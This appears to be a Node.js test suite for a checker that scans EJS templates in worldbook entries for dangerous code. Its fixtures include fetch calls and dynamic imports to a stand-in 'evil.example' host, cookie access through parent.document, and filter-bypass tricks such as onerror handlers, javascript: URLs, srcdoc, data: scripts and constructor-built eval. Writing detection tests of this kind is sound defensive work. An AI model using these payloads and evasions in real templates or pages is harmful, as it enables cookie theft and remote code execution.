import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import { buildAuditSnapshot } from "../src/ejs-checker/audit.mjs";
import * as contentModule from "../src/index.mjs";
import { analyzeProjectCodeV2, gateStatus } from "../src/index.mjs";

function report(content) {
  return analyzeProjectCodeV2([
    {
      fileName: "rules.json",
      type: "worldbook",
      text: JSON.stringify({ entries: [{ uid: 1, name: "Entry", content }] }),
    },
  ]);
}

function has(result, ruleId) {
  return result.findings.some((finding) => finding.ruleId === ruleId);
}

test("plain content is accepted and green", () => {
  const result = report("plain text");
  assert.equal(result.gate, "accept");
  assert.equal(result.audit, "green");
  assert.equal(result.certification, "pass");
});

test("high rule families are visible without changing the L-gate", () => {
  for (const [content, ruleId, certification] of [
    ['<% eval("1") %>', "M1", "fail"],
    ['<% new Function("return 1") %>', "M2", "fail"],
    ['<% fetch("http://1.2.3.4/x") %>', "M4", "review"],
    ["<% while(true){} %>", "M5", "fail"],
    ['<% atob("YQ==") %>', "AH1", "pass"],
    ['<% document.createElement("script") %>', "AH4", "pass"],
  ]) {
    const result = report(content);
    assert.equal(result.gate, "accept", `${ruleId} must not trigger the L-gate`);
    assert.equal(has(result, ruleId), true, `${ruleId} missing: ${JSON.stringify(result.findings)}`);
    assert.equal(result.certification, certification);
  }
});

test("API catalogue warns on missing await and arguments", () => {
  const missingAwait = report('<% getwi("entry").length; %>');
  assert.equal(has(missingAwait, "API1"), true, JSON.stringify(missingAwait.findings));
  const missingArgs = report("<% getwi(); %>");
  assert.equal(has(missingArgs, "API2"), true, JSON.stringify(missingArgs.findings));
  const correct = report('<% const x = (await getwi("entry")).length; %>');
  assert.equal(has(correct, "API1") || has(correct, "API2"), false);
});

test("URL and dynamic capability families remain visible", () => {
  const cases = [
    ['<% fetch("https://evil.example/x") %>', "U2"],
    ['<% fetch("http://1.2.3.4/x") %>', "U4"],
    ["<% const u = location.hash; fetch(u) %>", "U5"],
    ['<% globalThis["set"+"Timeout"]("1") %>', "AH2"],
    ['<% "<%".replace("%>", "") %>', "AH3"],
  ];
  for (const [content, ruleId] of cases) {
    const result = report(content);
    assert.equal(has(result, ruleId), true, `${ruleId} missing: ${JSON.stringify(result.findings)}`);
  }
});

test("L1-L7 high findings reject the upload", () => {
  const result = report("<% function exposed(){} %>");
  assert.equal(result.gate, "reject");
  assert.equal(result.audit, "not_applicable");
  assert.equal(result.certification, "fail");
  assert.equal(
    result.findings.some((finding) => /^L[1-7]$/.test(finding.ruleId)),
    true,
  );
});

test("EJS parse errors are high but not an L-gate rejection", () => {
  const result = report("<% if( %>");
  assert.equal(result.gate, "accept");
  assert.equal(result.certification, "fail");
  assert.equal(has(result, "EJS-PARSE"), true);
});

test("public index.mjs runtime exports stay in lockstep with index.d.ts", () => {
  const dts = readFileSync(new URL("../src/index.d.ts", import.meta.url), "utf8");
  const declared = [...dts.matchAll(/^export (?:function|const) ([A-Za-z0-9_]+)/gm)].map((match) => match[1]).sort();
  const runtime = Object.keys(contentModule).sort();
  assert.deepEqual(declared, runtime);
});

test("incomplete or broken checks (FILE, CHECKER-LIMIT, CHECKER-INTERNAL) reject the gate", () => {
  const badFile = analyzeProjectCodeV2([{ fileName: "broken.json", type: "worldbook", text: "{not-json" }]);
  assert.equal(badFile.gate, "reject");
  assert.equal(has(badFile, "FILE"), true);

  const tooManyEntries = analyzeProjectCodeV2([
    {
      fileName: "huge.json",
      type: "worldbook",
      text: JSON.stringify({
        entries: Array.from({ length: 2001 }, (_, uid) => ({ uid, name: "E", content: "ok" })),
      }),
    },
  ]);
  assert.equal(tooManyEntries.gate, "reject");
  assert.equal(has(tooManyEntries, "CHECKER-LIMIT"), true);

  assert.equal(gateStatus([{ ruleId: "CHECKER-INTERNAL", severity: "high" }]), "reject");
});

test("prevents silent M1-M4 bypasses across EJS-HTML overlap, javascript URLs, decorators, with, globals, constructor, import, and srcdoc", () => {
  // C-1: EJS overlapping HTML script / event handlers
  assert.equal(has(report("<script><% %> eval(1)</script>"), "M1"), true);
  assert.equal(has(report('<img src="x" onerror="<% %> eval(1)">'), "M1"), true);
  const brokenDynamicHtml = report("<script>ev<% %>al(1)</script>");
  assert.equal(has(brokenDynamicHtml, "AH2"), true, JSON.stringify(brokenDynamicHtml.findings));
  assert.equal(has(brokenDynamicHtml, "JS-PARSE"), false);

  // C-2: percent-encoded javascript: URLs and malformed % handling
  assert.equal(has(report('<a href="javascript://%0aeval(1)">x</a>'), "M1"), true);
  const malformedPct = report('<a href="javascript:%FF">x</a>');
  assert.equal(has(malformedPct, "JS-PARSE"), true, JSON.stringify(malformedPct.findings));
  assert.equal(has(malformedPct, "CHECKER-INTERNAL"), false);

  // C-3: leading @@ line containing EJS must still be analyzed
  assert.equal(has(report("@@unknown <% eval(1) %>"), "M1"), true);

  // WithStatement: benign usage stays accepted & green, while shadowed globals inside with are still caught
  const benignWith = report("<% { let x = 1; with (state) { x = 2; } } %>");
  assert.equal(benignWith.gate, "accept");
  assert.equal(benignWith.audit, "green");
  assert.equal(benignWith.findings.length, 0, JSON.stringify(benignWith.findings));

  const shadowedWith = report("<% { const eval = 0; with (globalThis) { eval(1); } } %>");
  assert.equal(shadowedWith.gate, "accept");
  assert.equal(has(shadowedWith, "M1"), true, JSON.stringify(shadowedWith.findings));

  // top / parent / frames global aliases
  assert.equal(has(report("<% top.eval('1') %>"), "M1"), true);
  assert.equal(has(report("<% parent.document.cookie %>"), "M3"), true);
  const framesFetch = report('<% frames.fetch("https://evil.example/steal") %>');
  assert.equal(has(framesFetch, "M4"), true);
  assert.equal(has(framesFetch, "U2"), true);

  // Function .constructor & dynamic import()
  assert.equal(has(report('<% (() => {}).constructor("return 1")() %>'), "M2"), true);
  assert.equal(has(report('<% unknownObj.constructor("return 1") %>'), "AH2"), true);
  const staticImport = report('<% await import("https://evil.example/mod.mjs") %>');
  assert.equal(has(staticImport, "M4"), true);
  assert.equal(has(staticImport, "U2"), true);
  const dynamicImport = report("<% await import(userUrl) %>");
  assert.equal(has(dynamicImport, "M4"), true);
  assert.equal(has(dynamicImport, "U5"), true);

  // <iframe srcdoc> & data:/blob: embedded script/frame sources
  assert.equal(has(report('<iframe srcdoc="<script>eval(1)</script>"></iframe>'), "M1"), true);
  const dataScript = report('<script src="data:text/javascript,eval(1)"></script>');
  assert.equal(has(dataScript, "M4"), true);
  assert.equal(has(dataScript, "AH2"), true);
});

test("handles deep binary expression chains and pathological link inputs without stack overflow or quadratic hang", async () => {
  const deepExpr = `<% { const x = ${"1+".repeat(19000)}1; } %>`;
  const files = [
    {
      fileName: "deep.json",
      type: "worldbook",
      text: JSON.stringify({ entries: [{ uid: 1, name: "Deep", content: deepExpr }] }),
    },
  ];
  const deepResult = analyzeProjectCodeV2(files);
  assert.equal(has(deepResult, "CHECKER-INTERNAL"), false, JSON.stringify(deepResult.findings));
  const snapshot = await buildAuditSnapshot(files, deepResult);
  assert.ok(snapshot.filesHash);

  const started = Date.now();
  const pathological = `<style>div { background: url(${" ".repeat(20000)} }</style>\n${"[".repeat(20000)}`;
  const linkResult = report(pathological);
  assert.equal(linkResult.gate, "accept");
  assert.ok(Date.now() - started < 2000, "link regex scanning should remain linear");
});
